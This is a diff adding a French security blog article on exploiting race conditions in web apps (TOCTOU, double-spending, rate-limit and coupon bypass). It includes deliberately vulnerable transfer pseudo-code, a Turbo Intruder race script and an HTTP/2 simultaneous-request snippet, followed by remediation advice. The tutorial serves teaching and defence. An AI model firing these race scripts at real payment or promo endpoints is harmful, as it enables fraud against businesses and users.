@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Race Conditions dans les Apps Web Modernes | Blog</title>
+    <meta name="description"
+        content="Exploiter les race conditions : TOCTOU, double-spending, bypass de rate limits avec Turbo Intruder.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --yellow: #eab308;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .article-hero {
+            background: linear-gradient(135deg, rgba(234, 179, 8, 0.1) 0%, rgba(0, 0, 0, 0) 50%);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2.5rem;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .article-hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--yellow), var(--primary));
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.25rem;
+            flex-wrap: wrap;
+        }
+
+        .article-date {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.15);
+            padding: 0.35rem 0.75rem;
+            border-radius: 6px;
+        }
+
+        .article-tag {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--yellow);
+            background: rgba(234, 179, 8, 0.15);
+            padding: 0.25rem 0.6rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        .article-hero h1 {
+            font-size: 2rem;
+            line-height: 1.25;
+            margin-bottom: 1rem;
+        }
+
+        .article-hero .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            padding-top: 1.25rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--yellow);
+        }
+
+        .hero-stat-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        .article-content h2 {
+            font-size: 1.4rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--primary);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+
+        .article-content h3 {
+            font-size: 1.15rem;
+            margin: 1.5rem 0 0.75rem;
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(234, 179, 8, 0.1);
+            padding: 0.15rem 0.4rem;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .concept-box {
+            background: linear-gradient(135deg, rgba(234, 179, 8, 0.1), rgba(0, 212, 255, 0.05));
+            border: 1px solid rgba(234, 179, 8, 0.3);
+            border-radius: 8px;
+            padding: 1.25rem;
+            margin: 1.5rem 0;
+        }
+
+        .concept-box strong {
+            color: var(--yellow);
+        }
+
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .article-hero h1 {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux articles</a>
+
+        <article>
+            <div class="article-hero">
+                <div class="article-meta">
+                    <span class="article-date"><i class="fas fa-calendar"></i> 2025-02-10</span>
+                    <span class="article-tag">Web</span>
+                    <span class="article-tag">Race Condition</span>
+                    <span class="article-tag">Burp</span>
+                </div>
+                <h1>Race Conditions dans les Apps Web Modernes</h1>
+                <p class="subtitle">Exploiter les failles de timing : TOCTOU, double-spending, bypass de rate limits.
+                    Techniques avec Turbo Intruder et HTTP/2.</p>
+                <div class="hero-stats">
+                    <div class="hero-stat">
+                        <div class="hero-stat-value">TOCTOU</div>
+                        <div class="hero-stat-label">Pattern</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value">HTTP/2</div>
+                        <div class="hero-stat-label">Single-packet</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value">$$$</div>
+                        <div class="hero-stat-label">Impact</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="article-content">
+                <h2>Qu'est-ce qu'une race condition ?</h2>
+                <p>Une race condition survient quand le comportement d'un système dépend de l'ordre d'exécution de
+                    plusieurs opérations concurrentes. En web, cela se produit quand plusieurs requêtes modifient le
+                    même état simultanément.</p>
+
+                <div class="concept-box">
+                    <strong><i class="fas fa-clock"></i> Pattern TOCTOU :</strong> Time-Of-Check to Time-Of-Use. Le
+                    système vérifie une condition (ex: solde suffisant) puis effectue l'action (ex: débit). Entre les
+                    deux, un attaquant peut modifier l'état.
+                </div>
+
+                <h2>Scénarios d'exploitation</h2>
+
+                <h3>1. Double-spending</h3>
+                <p>Dépenser le même solde plusieurs fois :</p>
+                <pre><code># Pseudo-code vulnérable
+def transfer(user, amount, to):
+    if user.balance >= amount:    # CHECK
+        time.sleep(0.1)           # Window!
+        user.balance -= amount    # USE
+        to.balance += amount
+        return "Success"
+    return "Insufficient funds"</code></pre>
+
+                <h3>2. Rate limit bypass</h3>
+                <p>Si le rate limit est vérifié avant d'incrémenter le compteur, plusieurs requêtes simultanées passent
+                    toutes.</p>
+
+                <h3>3. Coupon reuse</h3>
+                <p>Utiliser le même code promo plusieurs fois avant qu'il soit marqué comme utilisé.</p>
+
+                <h2>Techniques d'exploitation</h2>
+
+                <h3>Turbo Intruder (Burp Suite)</h3>
+                <pre><code># Script Turbo Intruder
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    
+    for i in range(30):
+        engine.queue(target.req, gate='race')
+    
+    engine.openGate('race')
+
+def handleResponse(req, interesting):
+    if '200' in req.response:
+        table.add(req)</code></pre>
+
+                <h3>HTTP/2 Single-packet attack</h3>
+                <p>HTTP/2 permet d'envoyer plusieurs requêtes dans un seul paquet TCP, garantissant qu'elles arrivent
+                    simultanément :</p>
+
+                <pre><code>import httpx
+
+async def race_attack():
+    async with httpx.AsyncClient(http2=True) as client:
+        # Préparer les requêtes
+        requests = [
+            client.post('/transfer', data={'amount': 100})
+            for _ in range(10)
+        ]
+        # Les envoyer simultanément
+        responses = await asyncio.gather(*requests)
+        return responses</code></pre>
+
+                <h2>Remédiation</h2>
+
+                <h3>Locks et mutex</h3>
+                <pre><code>async def safe_transfer(user_id, amount, to_id):
+    async with lock(f"user:{user_id}"):
+        user = await get_user(user_id)
+        if user.balance >= amount:
+            user.balance -= amount
+            await save_user(user)
+            # ... rest of transfer</code></pre>
+
+                <h3>Transactions atomiques</h3>
+                <pre><code>-- SQL avec FOR UPDATE
+BEGIN;
+SELECT balance FROM accounts 
+WHERE id = 123 FOR UPDATE;
+
+UPDATE accounts SET balance = balance - 100 
+WHERE id = 123;
+COMMIT;</code></pre>
+
+                <h3>Idempotency keys</h3>
+                <p>Chaque requête de modification a une clé unique. Les doublons sont rejetés.</p>
+
+                <h2>Conclusion</h2>
+                <p>Les race conditions sont souvent sous-estimées car difficiles à reproduire en test manuel. Les outils
+                    comme Turbo Intruder et les techniques HTTP/2 les rendent exploitables de manière fiable.</p>
+
+                <h2>Références</h2>
+                <ul>
+                    <li><a href="https://portswigger.net/research/smashing-the-state-machine" target="_blank"
+                            rel="noopener">PortSwigger — Smashing the State Machine</a></li>
+                    <li><a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534f" target="_blank"
+                            rel="noopener">Turbo Intruder</a></li>
+                </ul>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>© 2025 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
